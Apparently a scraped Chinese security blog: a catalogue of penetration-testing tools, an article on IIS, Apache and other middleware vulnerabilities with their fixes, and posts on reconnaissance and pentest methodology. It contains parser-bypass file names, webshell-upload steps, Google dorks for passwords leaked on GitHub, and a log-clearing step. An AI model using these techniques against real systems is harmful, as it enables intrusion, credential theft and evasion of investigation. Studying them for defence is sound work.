Powershell渗透库合集： Powershell tools合集： powershell的mimikittenz: 域渗透教程: 7.FuzzWeb向Fuzz工具： HTTP暴力破解，撞库攻击脚本： 8.漏洞利用及攻击框架msf框架： pocsscan攻击框架： Pocsuite攻击框架: Beebeeto攻击框架： 漏洞POC&amp;EXP:ExploitDB官方git版本: php漏洞代码分析 CVE-2016-2107: CVE-2015-7547 POC： JAVA反序列化POC生成工具: JAVA反序列化EXP: Jenkins CommonCollections EXP: CVE-2015-2426 EXP (windows内核提权): use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示): php7缓存覆写漏洞Demo及相关工具: XcodeGhost木马样本: 9.中间人攻击及钓鱼中间人攻击框架: Inject code, jam wifi, and spy on wifi users: 中间人代理工具: wifi钓鱼: 10.密码破解密码破解工具: 本地存储的各类密码提取利器: 11.二进制及代码分析工具二进制分析工具： 系统扫描器： rp: Windows Exploit Development工具： 二进制静态分析工具（python）: Python Exploit Development Assistance for GDB: 对BillGates Linux Botnet系木马活动的监控工具 木马配置参数提取工具: Shellphish编写的二进制分析工具（CTF向）: 针对python的静态代码分析工具: 一个自动化的脚本（shell）分析工具，用来给出警告和建议: 基于AST变换的简易Javascript反混淆辅助工具: 12.EXP编写框架及工具二进制EXP编写工具: CTF Pwn 类题目脚本编写框架: an easy-to-use io library for pwning development: 跨平台注入工具: 哈希长度扩展攻击EXP： 13.隐写隐写检测工具： 14.各类安全资料data_hacking合集: mobile-security-wiki: 书籍《reverse-engineering-for-beginners》: 一些信息安全标准及设备配置: APT相关笔记: Kcon资料: 《DO NOT FUCK WITH A HACKER》: 各类安全脑洞图： 信息安全流程图： 15.各类CTF资源近年ctf writeup大全： fbctf竞赛平台Demo: ctf Resources: ctf及黑客资源合集: ctf和安全工具大合集: ctf向 python工具包： 16.各类编程资源大礼包（什么都有）： bash-handbook: python资源大全: git学习资料: 安卓开源代码解析 python框架，库，资源大合集: JS 正则表达式库（用于简化构造复杂的JS正则表达式）: 17.Pythonpython 正则表达式库（用于简化构造复杂的python正则表达式）: python任务管理以及命令执行库: python exe打包库: Veil-Evasion免杀项目： py3 爬虫框架: 一个提供底层接口数据包编程和网络协议支持的python库: python requests 库 python 实用工具合集: python爬虫系统 18.福利微信自动抢红包动态库： 微信抢红包插件（安卓版 hardsed神器: 19.甲方安全工程师生存指南 web索引及日志搜索工具： 开源日志采集器： 扫描CS结构的web debuger 恢复sqlite数据库删除注册信息： gps欺骗检测工具: 应急处置响应框架: web安全开发指南: 各个知名厂商漏洞测试报告模板： linux下恶意代码检测包： 操作系统运行指标可视化框架： 恶意代码分析系统： 定期搜索及存储web应用： 事件响应框架： 综合主机监控检测平台： 分布式实时数字取证系统： Microsoft &amp; Unix 文件系统及硬盘取证工具： 20.蜜罐SSH蜜罐： 蜜罐集合资源： kippo进阶版蜜罐： SMTP 蜜罐： web应用程序蜜罐： 数据库蜜罐： web蜜罐： 21.远控用gmail充当C&amp;C服务器的后门： 开源的远控： c#远控： 22.工具合集(NoSQL扫描/爆破工具) (MySQL盲注爆破工具) (基于SQLMAP的主动和被动资源发现的漏洞扫描工具) (用于SQL Server审计的powershell脚本) (用于http header中的时间盲注爆破工具，仅针对MySQL / MariaDB) (Java编写的SQL注入工具) (基于搜索引擎的批量SQL注入漏洞扫描器) (在sqlmap基础上增加了目录扫描，hash爆破等功能) (Mysys以及MSSQL爆破脱裤工具) (批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试) (一个简单的HTTP暴力破解，撞库攻击脚本) (对各类服务进行弱口令检测的脚本) (根据用户习惯生成弱口令探测字典脚本) (Go写的协程版的ssh \\redis \\ mongodb弱口令破解工具) (暴力破解字典建立工具) (多线程探测弱口令) (支持测试CSRF，Clickjacking，Cloudflare和WAF的弱口令探测器) (对CiscoVPN，Citrix Gateway等各类服务进行弱口令检测的脚本) (物联网设备默认密码扫描检测工具) (使用nmap扫描IoT设备) (路由器设备漏洞扫描利用) (Telnet服务密码撞库) (自动化信息搜集及渗透测试工具，比较适用于IoT扫描) (嵌入式设备漏洞扫描及利用工具) (一款XSS扫描器，可暴力注入参数) (小型XSS扫描器，也可检测CRLF，XSS，点击劫持的) (PHP版本的反射型xss扫描) (批量扫描XSS的python脚本) (自动化检测页面是否存在XSS和跨站请求伪造漏洞的浏览器插件) (使用命令行进行XSS批量检测) (可识别和绕过WAF的XSS扫描工具) (支持GET，POST方式的高效XSS扫描器) (网络资产识别引擎，漏洞检测引擎) (企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱，子域名，主持人) (Bing，google，360，zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息) (能成抓取搜索引擎隐藏的url，并交由sqlmap，nmap扫描) (企业内网基础服务安全扫描框架) (github Repo信息搜集工具) (.svn文件夹泄漏利用工具) (GitHub敏感信息扫描工具) (企业资产，敏感信息GitHub泄露监控系统) (根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具) (github敏感信息搜索工具) ( .git文件夹泄漏利用工具) (GitHub敏感信息扫描工具，包括检测提交等) (自动化对指定域名进行Google hacking搜索并收集信息) (用于搜索git的承诺中的敏感信息，例如密码，私钥等的客户端工具) (Github敏感信息泄露扫描) (Github泄露巡航工具) (Web站点信息搜集工具，包括邮箱，电话等信息) (集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具) (可以提取网址，电子邮件，文件，网站帐户等的高速爬虫) (一款简单的webshell检测工具) (哈勃分析系统，LINUX系统病毒分析及安全检测) (使用python实现的集成ClamAV，ESET，Bitdefender的反病毒引擎) (一款高效率PHP-webshell扫描工具) (测试效率高达99%的webshell检测工具) (一款简洁的的Webshell扫描工具) (Webshell扫描工具，支持php / perl / asp / aspx webshell扫描) (一款木马，僵尸网络分析框架) (高级安卓木马病毒分析框架) (基于网络流量的内网探测框架) (调用Windows API枚举用户登录信息) (自动化利用XSS入侵内网) (目标端口扫描+系统服务指纹识别) (动态多线程敏感信息泄露检测工具) (WAF产品指纹识别) (SSL类型识别) (Web指纹识别) (Web应用指纹识别) (网络爬虫式指纹识别) (基于Masscan和Zmap的网络扫描器) (网络资产信息扫描，ICMP存活探测，端口扫描，端口指纹服务识别) (中间件扫描) (web路径收集与扫描) (C段横幅与路径扫描) (端口服务扫描) (waf自动暴破) (尝试找出cdn背后的真实ip) (基于Bing搜索引擎的C段/旁站查询，多线程，支持API) (多线程WEB目录爆破工具) (一个爬虫式的网段Web主机发现小工具) (Thorn上实现的分布式任务分发的ip端口漏洞扫描器) (类似zgrab的快速TCP指纹抓取解析工具，支持更多协议) (CDN识别，检测) (基于爬虫的web路径扫描器) (服务器ssh配置信息扫描) (针对域名及其子域名的资产数据检测/扫描，包括http / https检测等) (域名资产收集及指纹识别工具) (CMS识别python gevent实现) (敏感文件扫描/二次判断降低误报率/扫描内容规则化/多目录扫描) (基于爬虫的动态敏感文件探测工具) (web路径扫描工具) (网络设备web服务指纹扫描与检索) (目标主机服务ssl类型识别) (Web应用fuzz工具，框架，同时可用于web路径/服务扫描) (多线程的后台路径扫描器，也可用于发现重定向漏洞后执行) (弱口令扫描器，不仅支持普通登录页，也支持ssh，mongodb等组件) (渗透测试辅助工具，支持分析数据包，解码，端口扫描，IP地址分析等) (基于nmap的扫描器，与cve漏洞关联) (基于nmap的高级漏洞扫描器，命令行环境使用) (web应用信息搜集工具) (围绕web服务的域名进行信息收集和“域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等) (基于Nikto扫描规则的被动式路径扫描以及信息爬虫) (快速识别WEB服务器类型，CMS类型，WAF类型，WHOIS信息，以及语言框架) (用于检查web服务的http header的安全性) (一款高效快捷的敏感文件扫描工具) (通过字典穷举，google，robots.txt等途径的跨平台后台管理路径扫描器) (常规CMS指纹识别) (WAF指纹识别及自动化绕过工具) (网络应用模糊工具，框架，同时可用于网络路径/服务扫描) (web敏感目录/信息泄漏扫描脚本) (用于网站或IP地址的信息收集工具) (通过扫描全网获得真实IP的自动化程序) (分布式WEB指纹识别平台) (爬虫式web目录扫描工具) (Jenkins漏洞探测，用户抓取爆破) (首款集成化的Discuz扫描工具) (一款简洁优雅的CMS扫描利用框架) (IIS短文件名暴力枚举漏洞利用工具) (flashxss扫描) (一个起毛服务器端模板注入漏洞的半自动化工具) (服务器端模板注入漏洞检测与利用工具) (Docker扫描工具) (一款精简的wordpress扫描工具) (集成化wordpress漏洞利用框架) (用于扫描J2EE应用的一款burpsuite插件) (一款基于perl的strut2的历史漏洞扫描器) (本地文件包含漏洞利用及扫描工具，支持反弹shell) (基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA，slack平台结合使用) (自动化探测客户端AngularJS模板注入漏洞工具) (Java编写的IIS短文件名暴力枚举漏洞利用工具) (基于WPScan以及WPSeku的优化版wordpress扫描器) (CMS渗透测试框架) (CRLF注入漏洞批量扫描) (自动化扫描内网中存在的由影子经纪人泄露的ETERNAL系列漏洞) (通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描) (本地文件包含漏洞利用及扫描工具，支持反弹shell) (用于枚举脚本的GET / POST未知参数字段) (struts2的漏洞全版本检测和利用工具) (SSL漏洞扫描，例如心脏滴血漏洞等) (基于搜索引擎的漏洞网页搜寻) (用于攻击爆破Java RemoteMethod Invocation服务的工具) (扫描js扩展库的常见漏洞) (针对的hadoop /火花等大数据平台的的漏洞探测工具) (RegEx拒绝服务扫描器) (使用NMAP扫描的Tor网络上隐藏的“洋葱”服务) (Web CMS Exploit工具，包含针对主流CMS的66个不同的漏洞利用) (一个迷你的信息泄漏批量扫描脚本) (文件上传漏洞扫描器及利用工具) (子域名接管漏洞检测工具，支持30+云服务托管检测) (WordPress的漏洞扫描器，同时也支持敏感文件泄露扫描) (检测网站依赖的JavaScript库中存在的已知通用漏洞) (自动检测上传功能是否可上传webshell) (CMS指纹识别及自动化渗透测试框架) (论坛框架vBulletin黑盒漏洞扫描器) (CMS指纹识别及自动化渗透测试框架) (CMS漏洞检测和利用套件) (AWS安全审计工具) (针对wp，magento，joomla等CMS的漏洞扫描器及自动利用工具) (OWASP旗下joomla漏洞扫描项目) (用于检测因错误配置导致敏感信息暴露的Django应用程序) (无线安全审计工具) (Python网络/渗透测试工具) (无线安全渗透测试套件) (无线网络审计工具，支持2-5GHZ频段) (ARP欺骗，无线网络劫持) (检查wifi是否是“大菠萝”所开放的热点，并给予网络评分) (自动化无线网络攻击工具wifite的重构版本) (基于BBScan via.lijiejie的本地网络扫描) (基于JavaScript的的本地网络扫描 (白盒代码安全审计系统) (静态PHP代码审计) (跟踪，分析PHP运行情况的工具) (NodeJS应用代码审计) (Python应用审计) (Ruby on Rails应用静态代码分析) (Python应用静态代码审计) (WordPress插件代码安全审计) (用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码)  (用于检测潜在安全漏洞的PHP静态代码分析工具)  (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)  (集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)  (BkScanner分布式，插件化web漏洞扫描器)  (ysrc出品的被动式漏洞扫描工具)  (基于http代理的web漏洞扫描器)  (自动化扫描器，包括中间件扫描以及设备指纹识别)  (定向全自动化渗透测试工具)  (自动化渗透测试框架，支持cdn真实ip查找，指纹识别等)  (蟒插件化漏洞扫描器，支持生成扫描报表)  (渗透测试插件化并发框架)  (支持检测SQLI/ XSS / LFI / RFI等漏洞的扫描器)  (Web图形化的漏洞扫描框架)  (一款网络化的自动化渗透测试框架)  (一款集成信息收集，漏洞扫描，指纹识别等的多合一扫描工具)  (高度集成化的Web应用漏洞扫描框架，支持REST，RPC等api调用)  (集成化渗透测试辅助平台及漏洞管理平台)  (渗透测试集成框架，包含超过38,000+攻击)  (基于铬/歌剧插件的被动式漏洞扫描)  (支持多种网络漏洞扫描，命令行环境使用)  (web应用扫描器，支持指纹识别，文件目录爆破，SQL / XSS / RFI等漏洞扫描，也可直接用于struts，ShellShock等扫描)  (集成子域名枚举，nmap，waf指纹识别等模块的web应用扫描器)  (使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞)  (Web应用自动化扫描框架，支持自动化上传webshell)  (一款开源Poc调用框架，可轻松调用Pocsuite，Tangscan，Beebeeto，Knowsec老版本POC，可使用docker部署)  (斗象能力中心出品并长期维护的开源漏洞检测框架)  (Web应用漏洞扫描框架)  (Web应用漏洞扫描框架，基于python3)  (被动式漏洞扫描，支持历史cve编号漏洞识别)  (OWASP ZAP核心项目出品的综合性渗透测试工具)  (Web服务综合型扫描器，用于指定目标的资产收集，安全配置缺陷或者安全漏洞扫描)  (一款多方位信息收集，指纹识别及漏洞扫描工具)  (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞，支持输出pdf报告)  (渗透测试辅助工具，综合利用框架) (基于被动式扫描框架的自动化web漏洞扫描工具) (渗透测试辅助框架，包含信息搜集，无线渗透，网络应用扫描等功能) (内置1200+插件的web漏洞扫描框架) (Web服务安全评估工具，提供基于windows操作系统的简单.exe应用) (使用去开发的可扩展以及高并发渗透测试框架) (基于Flask应用框架的漏洞扫描系统) (一个操作上类似metasploit的web应用安全审计框架 (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞) (集成104个模块的Web应用程序渗透测试框架) (一款APT入侵痕迹扫描器) (ICS设备nmap扫描脚本) (SDN安全评估框架) "},{"title":"Web中间件常见漏洞总结（一）","date":"2021-08-15T12:37:52.000Z","url":"/2021/08/15/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","tags":[["iis","/tags/iis/"]],"categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。 一、 常见web中间件及其漏洞概述（一） IIS1、PUT漏洞 2、短文件名猜解 3、远程代码执行 4、解析漏洞 （二） Apache1、解析漏洞 2、目录遍历 （三） Nginx1、文件解析 2、目录遍历 3、CRLF注入 4、目录穿越 （四）Tomcat1、远程代码执行 2、war后门文件部署 （五）jBoss1、反序列化漏洞 2、war后门文件部署 （六）WebLogic1、反序列化漏洞 2、SSRF 3、任意文件上传 4、war后门文件部署 （七）其它中间件相关漏洞1、FastCGI未授权访问、任意命令执行 2、PHPCGI远程代码执行 二、 IIS漏洞分析（一） IIS简介IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。 IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据 （二） PUT漏洞1、漏洞介绍及成因 IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 2、漏洞复现 1） 开启WebDAV 和写权限 2） 利用burp测试 抓包，将GET请求改为OPTIONS 3）利用工具进行测试 成功上传，再上传一句话木马，然后用菜刀连接，getshell 3、漏洞修复 关闭WebDAV 和写权限 （二）短文件名猜解1、漏洞介绍及成因 IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 2、漏洞复现 1）、在网站根目录下添加aaaaaaaaaa.html文件 2） 进行猜解 3、漏洞修复 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 修复后： 4、局限性 \\1) 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解； \\2) 如果文件名本身太短（无短文件名）也是无法猜解的； \\3) 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配； （三） 远程代码执行1、 漏洞介绍及成因 在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 2、 漏洞复现 1）漏洞环境搭建 在windows server 2003 r2 32位上安装iis6.0 2） 触发漏洞 在本地执行exp，exp如下 执行成功后，服务器端弹出计算器： 3、 漏洞修复 1）关闭 WebDAV 服务 2） 使用相关防护设备 （四） 解析漏洞1、 漏洞介绍及成因 IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这一漏洞有两种完全不同的利用方式： 2、漏洞复现 利用方式 1 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 利用方式 2 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” ，可谓 “ 修理 ” ？举个例子，当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 3、 漏洞修复 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 三、 Apache漏洞分析（一） Apache简介Apache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 （二） 解析漏洞1、 漏洞介绍及成因 Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题。 Apache文件解析漏洞涉及到一个解析文件的特性： Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy php-&gt;发现后缀是php，交给php处理这个文件 2、 漏洞复现 上传一个后缀名为360的php文件 3、 漏洞修复 将AddHandler application/x-httpd-php .php的配置文件删除。 （三） 目录遍历1、 漏洞介绍及成因 由于配置错误导致的目录遍历 2、 漏洞复现 3、 漏洞修复 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； "},{"title":"web渗透详细过程之信息收集篇","date":"2021-08-06T08:58:11.000Z","url":"/2021/08/06/web%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"Web渗透详细过程之信息收集篇前言在这大千世界中，总有让你心动的目标。当你偶然遇见一位成熟稳重的帅哥，不用我说那内心的小鹿肯定开始乱撞，冰封已久的冰山开始融化。想要把小哥哥追到手，需要一步步来。首先要进行信息收集，需要知道他的个人信息，例如叫什么，联系方式，喜好，在哪里工作，做什么行业，或者家庭住址等等。 收集域名信息通常我们想知道这个心上人叫什么的时候就要想办法得到他的名片，上边一般都会介绍他的姓名，职业，所在单位，单位地址。 在这里对目标进行whois查询，查询域名是否被注册、注册商、DNS。就好比看对方的名片一样。以下介绍几种获取对方名片的方法。 whois查询1、域名whois查询-站长之家  2、IP138网站  3、域名信息查询-腾讯云  4、ICANN LOOKUP  备案信息查询1、SEO综合查询  2、ICP备案查询-站长工具  IP反查站点1、Dnslytics 利用Dnslytics反查IP可以得到如下信息 利用Dnslytics反查域名可以得到如下信息  相关应用信息1、天眼查  2、七麦数据  查找真实IP在一些大的网站都会使用CDN(内容分发网络)，它可以使内容传输的更快、更加稳定。，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。一般CDN隐藏了目标服务器的真实的IP，也提高了安全性。就像你找人家问他的名字，他就告诉你假的名字或外号，这一看对你兴趣不大啊，这时连心上人的真名字都不知道怎嘛进行下一步，那不凉凉了。这里说下如何识别给你的名字是真的还是假的，给假的名字情况下如何获取真实姓名。 如何判断是否使用CDN1、ping目标主域 通过ping目标主域，观察域名解析情况来判断是否使用CDN。 发现使用了CDN。 2、Nslookup 不同DNS解析结果若不一样，很有可能存在CDN服务。 3、ping检测平台 Ping检测-站长工具地址： 绕过CDN常见方法1、ping主域 有的网站只让www域名使用CDN,可以去掉www在ping下。 2、DNS历史查找 CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。以下介绍几个平台   3、查询子域名方法 一般都是主站加入CDN，子域名站点很多没有加入，可以通过子域名来获取，下边有收集子域名详细介绍，在这里举例一个。  4、网站邮件头信息 比如说，邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。注意：必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的。 5、网络空间搜索引擎法 通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。 钟馗之眼：：： 6、网站漏洞查找 通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。 收集子域名之前已经获取地址和姓名了，那就让我们大声把爱说出来。万一和心上人表白失败了，我们不要放弃，毕竟这样不容得到的男人才香啊，之前了解他的工作单位了或者家庭地址了，我们可以从他的同事或者邻居入手，通常这样更容易获取汉子的信息，方便更加深入的了解他。说不定能从同事或者邻居那边美言下，拿下这个高冷的男人了。 在线平台1、IP138  2、站长工具  3、hackertarget  4、phpinfo  5、dnsdumpster  6、zcjun  7、Censys  IP反查绑定域名网站1、chinaz  2、爱站  3、webscan.cc  资产搜索引擎个人常用的有Google、FOFA，也可以使用Shodan、zoomeye钟馗之眼. 1、Google语法 常用语法 2、FOFA语法 可以在首页点击查询语法来查看 工具枚举在这里常用的sublist3r、OneForAll、subDomainsBrute. 1、sublist3r 下载地址: 2、OneForAll 下载地址：运行完成后会生成一个csv文件 3、subDomainsBrute 下载地址： 利用DNS收集常见的DNS记录有以下几类： MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录。 NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录。 SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器。 TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录。 DNS域传送漏洞 1、原理：DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。2、DNS域传送漏洞检测基本过程 nslookup #进入交互式shell server dns.xx.yy.zz #设定查询将要使用的DNS服务器 ls xx.yy.zz #列出某个域中的所有域名 exit #退出漏洞检测-不存在漏洞 站点信息收集乖乖，现在撩汉子容易吗，咱们接下来在了解下他的爱好，喜欢健身还是喜欢去娱乐场所还是宅在家里，出去玩的话都去哪里玩，喜欢吃什么等等。为咱们下一步攻势做好准备，就不信俘获不到小哥哥的芳心。 判断对方是win还是Linux1、TTL值 可以通过ping来查看，不过不一定非常准可以被修改，默认Linux是64，win是128win： Linux： 2、Nmap 使用命令：nmap -O IP 端口收集nmap CMS指纹识别CMS（内容管理系统）用于网站内容管理，通过识别CMS类型可以查看相应的漏洞拿下站点。如今，网上一些在线的网站查询CMS指纹识别，如下所示：BugScaner: 潮汐指纹：云悉：: 云悉指纹: :  目录扫描1、御剑扫描 2、dirbuster 首先在Target URL输入框中输入要扫描的网址并将扫描过程中的请求方法设置为“Auto Switch(HEAD and GET)”。自行设置线程（太大了容易造成系统死机哦）选择扫描类型，如果使用个人字典扫描，则选择“List based bruteforce”选项。单击“Browse”加载字典。单机“URL Fuzz”，选择URL模糊测试（不选择该选项则使用标准模式）在URL to fuzz里输入“/{dir}”。这里的{dir}是一个变量，用来代表字典中的每一行，运行时{dir}会被字典中的目录替换掉。点击“start”开始扫描 也可以使用kali自带的 3、dirscan 下载地址： 4、dirsearch 下载地址： Google Hacking他基本语法上边有介绍，介绍下典型用法： 查找指定后台地址 查看指定网站的文件上传漏洞 注入页面 目录遍历漏洞 SQL错误 phpinfo() 配置文件泄露 数据库文件泄露 日志文件泄露 备份和历史文件泄露 公开文件泄露 邮箱信息 社工信息 通过用户的一些信息（Mail、Name、ID、Tel）查询用户注册过哪些应用 Github信息泄漏很多网站及系统都会使用pop3和smtp发送来邮件，不少开发者由于安全意识不足会把相关的配置文件信息也放到Github上，所以如果这时候我们动用一下Google搜索语法，就能把这些敏感信息给找出来了。 site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cn 数据库信息泄露： site:Github.com sa passwordsite:Github.com root password 总结要想拿下小哥哥当然要一步步来，前边的信息收集工作是非常重要的。从开始的选择目标，到获取简单的个人信息，如何看对方是否欺骗自己，再到如果拒绝失败从他身边的人下手。可以说能否追求成功这个收集工作起到至关重要的位置。主要是用来新手之间互相交流下经验，老司机可以继续开车了。 参考文档：   "},{"title":"渗透测试基本思路","date":"2021-08-05T07:12:05.000Z","url":"/2021/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/","tags":[["信息收集","/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"],["漏洞扫描","/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"]],"categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"​ 有人问我，渗透到底做啥，web渗透到底是干什么，当你拿到一个待检测得站或网站，需要做什么。以我得经验其实web渗透是一个非常简单得事情。今天我就以个人经验来谈一谈怎么去渗透一个网站。 一、信息收集 获取域名的 whois 信息,获取注册者邮箱姓名电话等。 通过站长之家、明小子、k8 等查询服务器旁站以及子域名站点，因为主站一般比较难， 所以先看看旁站有没有通用性的 cms 或者其他漏洞。 通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS 历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业域名与 ip。 通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞 通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针、管理员备份文件。 google hack 进一步探测网站的信息，后台，敏感文件 敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store 源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟馗之眼、天眼查、威胁情报、微步在线等 通过Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录 二、漏洞扫描 用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等 用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。 漏洞利用 ​ 利用以上的方式拿到 webshell，或者其他权限 4.权限提升 ​ 提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞， 如 iis6,pr,巴西烤 肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 5.日志清理 ​ 操作系统、中间件、数据库等日志进行清除 